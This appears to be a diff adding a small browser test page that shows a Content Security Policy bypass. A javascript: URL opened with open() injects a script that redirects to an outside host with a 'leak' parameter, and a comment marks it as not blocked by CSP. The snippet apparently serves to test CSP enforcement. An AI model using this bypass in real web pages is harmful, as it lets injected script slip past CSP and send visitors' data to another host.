@@ -1,0 +1,6 @@
+<script>
+    //url1 = "javascript:eval(`alert(1)`)";
+    //open(url1);  //Blocked by CSP
+    url2 = "javascript:'<script>eval(\\'document.location = \"https://adition.com/report/?leak=c992698\"\\')<\/script>'";
+    open(url2);  // Not blocked by CSP.
+</script>
